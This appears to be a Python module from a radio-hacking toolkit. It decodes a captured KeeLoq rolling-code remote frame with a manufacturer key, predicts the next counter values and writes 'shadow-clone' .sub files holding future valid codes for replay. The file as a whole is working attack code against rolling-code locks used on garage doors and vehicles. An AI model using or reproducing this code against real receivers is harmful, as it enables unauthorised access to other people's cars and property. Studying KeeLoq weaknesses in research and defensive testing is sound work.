"""KeeLoq next-code prediction & shadow-clone .sub generation."""

from __future__ import annotations

from omni.rf import keeloq_crypto as kq
from omni.rf.keystore import manufacturer_key, resolve_man
from omni.rf.protocols.keeloq import next_counter


def _entry_for(sub, keystore):
    if keystore is None or not sub.manufacture:
        return None
    return keystore.get(sub.manufacture)


def _start(sub, entry, start_cnt):
    """Decode the current counter (needs the manufacturer key)."""
    fix, hop = kq.split_frame(sub.key)
    if entry is None:
        return fix, None, None
    if start_cnt is not None:
        return fix, manufacturer_key(entry, fix, sub.seed), (start_cnt & 0xFFFF)
    man, dec = resolve_man(entry, fix, hop, sub.seed)
    if dec is None:
        return fix, None, None
    return fix, man, dec & 0xFFFF


def _mode_of(sub, counter_mode):
    if counter_mode is not None:
        return counter_mode
    if sub.counter_mode is not None:
        return sub.counter_mode
    return 2


def predicted_counters(sub, keystore=None, count: int = 4,
                       counter_mode=None, start_cnt=None):
    """(manufacture_name, [next counter, ...]) for a captured KeeLoq .sub."""
    entry = _entry_for(sub, keystore)
    name = entry.name if entry is not None else (sub.manufacture or "Unknown")
    _fix, man, cnt = _start(sub, entry, start_cnt)
    if man is None:
        return name, []
    mode = _mode_of(sub, counter_mode)
    chain = []
    for _ in range(max(0, count)):
        cnt = next_counter(cnt, mode)
        chain.append(cnt)
    return name, chain


def clone_next_subs(sub, keystore=None, steps: int = 4,
                   counter_mode=None, start_cnt=None):
    """Pre-compute `steps` future codes as replayable .sub files."""
    entry = _entry_for(sub, keystore)
    fix, man, cnt = _start(sub, entry, start_cnt)
    clones = []
    counters: list[int] = []

    if man is None:
        # unknown manufacturer: replay the captured hop (no increment possible)
        for _ in range(max(0, steps)):
            clone = sub.copy()
            clones.append(clone)
        return clones, counters

    btn, serial = kq.parse_fix(fix)
    mode = _mode_of(sub, counter_mode)
    for _ in range(max(0, steps)):
        cnt = next_counter(cnt, mode)
        counters.append(cnt)
        word = (((btn & 0xF) << 28) | ((serial & 0x3FF) << 16)
                | (cnt & 0xFFFF))
        hop = kq.keeloq_encrypt(word, man)
        clone = sub.copy()
        clone.key = kq.join_frame(fix, hop)
        clone.counter_mode = mode
        clones.append(clone)
    return clones, counters
